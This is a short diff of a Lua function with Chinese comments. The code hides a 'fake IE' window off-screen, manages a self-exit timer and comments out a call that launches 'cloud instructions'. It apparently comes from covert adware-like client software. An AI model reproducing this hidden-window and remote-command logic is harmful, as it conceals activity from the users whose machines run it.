@@ -836,15 +836,17 @@ function PreTipMain()
 		--将窗口区域移到屏幕外面
 		bHideFakeIE = true
 		--监听自杀事件
-		CreateFilterListener()
-		
-		--读本地配置，设置超时自杀,默认10min
-		local tLocalUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
-		local nKillSelfDelay = tLocalUserConfig["nKillSelfDelay"] or 1000*60*10
-		SetOnceTimer(function() tipUtil:Exit("Exit") end, nKillSelfDelay)
+		tipAsynUtil:AsynPostWndMsg(nil,"{C3CE0473-57F7-4a0a-9CF4-C1ECB8A3C514}_dsmainmsg_ie",1024+401,0,0,function(nRet)
+			CreateFilterListener()
+			
+			--读本地配置，设置超时自杀,默认不自杀
+			local tLocalUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
+			local nKillSelfDelay = tLocalUserConfig["nKillSelfDelay"]
+			SetOnceTimer(function() tipUtil:Exit("Exit") end, nKillSelfDelay or 0)
+		end)
 		
 		--拉起云指令
-		RunJsHost()
+		--RunJsHost()
 	else
 		--非开机启动，则发自杀消息,杀掉隐藏的伪IE
 		tipAsynUtil:AsynPostWndMsg(nil,"{C3CE0473-57F7-4a0a-9CF4-C1ECB8A3C514}_dsmainmsg_ie",1024+401,0,0,function(nRet)
